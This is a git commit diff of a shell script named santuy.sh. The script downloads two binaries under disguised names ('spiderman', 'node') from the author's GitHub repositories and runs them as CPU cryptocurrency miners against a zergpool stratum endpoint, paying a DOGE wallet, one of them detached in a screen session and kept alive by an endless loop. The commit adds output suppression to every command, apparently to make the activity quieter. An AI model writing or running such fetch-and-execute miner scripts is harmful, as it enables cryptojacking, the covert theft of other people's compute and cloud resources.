3f56b0ca535ddcd4e9b24d21e8cd7617d277309b
makaryobos <90647406+makaryobos@users.noreply.github.com>
2021-09-21 07:08:20 +0700

    Update santuy.sh

--- santuy.sh
+++ santuy.sh
@@ -1,13 +1,13 @@
 #!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://raw.githubusercontent.com/makaryobos/spiderman/main/spiderman
-screen -dmS run ./spiderman -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-kin) -t 2 -p c=DOGE x -b --max-cpu-usage=75 0.0.0.0:3333 -m simple
+sudo apt update  >/dev/null
+sudo apt install screen -y  >/dev/null
+wget https://raw.githubusercontent.com/makaryobos/spiderman/main/spiderman  >/dev/null
+screen -dmS run ./spiderman -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-kin) -t 2 -p c=DOGE x -b --max-cpu-usage=75 0.0.0.0:3333 -m simple  >/dev/null
 
 
-wget https://raw.githubusercontent.com/makaryobos/privasi/main/node 
+wget https://raw.githubusercontent.com/makaryobos/privasi/main/node  >/dev/null
 chmod +x node
-./node -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-kin) -t 2 -p c=DOGE -x --max-cpu-usage=75
+./node -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-kin) -t 2 -p c=DOGE -x --max-cpu-usage=75  >/dev/null
 while [ 1 ]; do
 sleep 3
 done
